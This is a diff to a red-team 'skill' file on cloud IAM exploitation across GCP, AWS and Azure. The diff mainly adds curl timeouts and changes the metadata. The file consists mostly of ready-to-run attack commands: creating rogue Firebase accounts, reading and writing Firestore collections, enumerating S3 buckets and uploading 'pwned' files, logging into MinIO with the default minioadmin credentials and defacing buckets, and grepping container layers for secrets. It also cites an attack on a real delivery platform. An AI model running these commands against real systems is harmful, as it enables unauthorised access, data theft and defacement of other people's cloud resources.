@@ -1,8 +1,11 @@
 ---
 name: cloud-iam-deep
 description: "GCP/AWS/Azure cloud exploitation -- Cloud Functions, Firestore, Cloud Run, S3, MinIO, Blob Storage, SA keys"
-sources: field_ops, real_targets
-report_count: 25+
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [cloud, IAM, AWS, GCP, Azure, privilege-escalation, redteam]
 ---
 
 # Cloud IAM Deep -- Cloud Functions, Storage, IAM Exploitation
@@ -145,17 +148,17 @@ if r.status_code == 200:
 ## Firebase Open SignUp
 
 ```bash
-curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY"   -H "Content-Type: application/json"   -d '{"email":"attacker@domain.com","password":"Senha123!","returnSecureToken":true}'
+curl --max-time 30 --connect-timeout 10 -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY"   -H "Content-Type: application/json"   -d '{"email":"attacker@domain.com","password":"Senha123!","returnSecureToken":true}'
 ```
 
 ## Firestore Public Access Test
 
 ```bash
-curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users?key=$API_KEY"
-curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores?key=$API_KEY"
+curl --max-time 30 --connect-timeout 10 -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users?key=$API_KEY"
+curl --max-time 30 --connect-timeout 10 -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores?key=$API_KEY"
 
 # Test WRITE
-curl -X PATCH "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores/ID?updateMask.fieldPaths=fieldName"   -H "Content-Type: application/json"   -d '{"fields":{"fieldName":{"stringValue":"test"}}}'
+curl --max-time 30 --connect-timeout 10 -X PATCH "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores/ID?updateMask.fieldPaths=fieldName"   -H "Content-Type: application/json"   -d '{"fields":{"fieldName":{"stringValue":"test"}}}'
 ```
 
 **Real-world case (CRITICAL)**: Delivery platform -- 3 Firebase projects:
@@ -204,21 +207,21 @@ for i, layer in enumerate(r.json().get('layers', [])):
 
 # Extract and search for secrets
 # tar -xzf layer.tar.gz
-# grep -r "MIGRATION_TOKEN|APP_KEY|DB_PASSWORD" .
+# grep -rE "MIGRATION_TOKEN|APP_KEY|DB_PASSWORD" .
 ```
 
 ## S3 Bucket Enumeration and Upload Testing
 
 ```bash
 # Test if bucket is public
-curl -s "http://bucket-name.s3.amazonaws.com/"
+curl --max-time 30 --connect-timeout 10 -s "http://bucket-name.s3.amazonaws.com/"
 
 # Upload (if writable)
-curl -X PUT "http://bucket-name.s3.amazonaws.com/test.txt"   -H "Content-Type: text/plain" -d "pwned"
+curl --max-time 30 --connect-timeout 10 -X PUT "http://bucket-name.s3.amazonaws.com/test.txt"   -H "Content-Type: text/plain" -d "pwned"
 
 # Test common bucket names
 for b in "target" "target-prod" "target-dev" "target-images" "target-uploads"          "target-backup" "target-media" "download.target.com" "static.target.com"; do
-  r=$(curl -sk -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" 2>/dev/null)
+  r=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" 2>/dev/null)
   [ "$r" != "404" ] && echo "$b -> HTTP $r"
 done
 ```
@@ -227,26 +230,26 @@ done
 
 ```bash
 # Health check
-curl -sI "http://host:9000/minio/health/live"
+curl --max-time 30 --connect-timeout 10 -sI "http://host:9000/minio/health/live"
 
 # Admin API
-curl -s "http://host:9000/minio/admin/v3/info"
+curl --max-time 30 --connect-timeout 10 -s "http://host:9000/minio/admin/v3/info"
 
 # Web console login (port 9001)
-curl -X POST "http://host:9001/api/v1/login"   -H "Content-Type: application/json"   -d '{"accessKey":"minioadmin","secretKey":"minioadmin"}'
+curl --max-time 30 --connect-timeout 10 -X POST "http://host:9001/api/v1/login"   -H "Content-Type: application/json"   -d '{"accessKey":"minioadmin","secretKey":"minioadmin"}'
 
 # List bucket objects
-curl -s "http://host:9000/bucket-name?list-type=2"
+curl --max-time 30 --connect-timeout 10 -s "http://host:9000/bucket-name?list-type=2"
 
 # Upload
-curl -X PUT "http://host:9000/bucket-name/file.html"   -H "Content-Type: text/html; charset=utf-8" -d "<h1>Pwned</h1>"
+curl --max-time 30 --connect-timeout 10 -X PUT "http://host:9000/bucket-name/file.html"   -H "Content-Type: text/html; charset=utf-8" -d "<h1>Pwned</h1>"
 ```
 
 ## Azure Blob Storage Testing
 
 ```bash
 # URL pattern: https://{storage_account}.blob.core.windows.net/{container}
-curl -s "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list"
+curl --max-time 30 --connect-timeout 10 -s "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list"
 ```
 
 ## Pitfalls
@@ -264,5 +267,5 @@ curl -s "https://storageaccount.blob.core.windows.net/container?restype=containe
 # Verify SA key works
 python3 -c "from google.oauth2 import service_account; creds = service_account.Credentials.from_service_account_file('sa.json'); print(creds.valid)"
 # Verify Cloud Function
-curl -s "https://us-central1-PROJECT.cloudfunctions.net/FUNC" | head -5
+curl --max-time 30 --connect-timeout 10 -s "https://us-central1-PROJECT.cloudfunctions.net/FUNC" | head -5
 ```
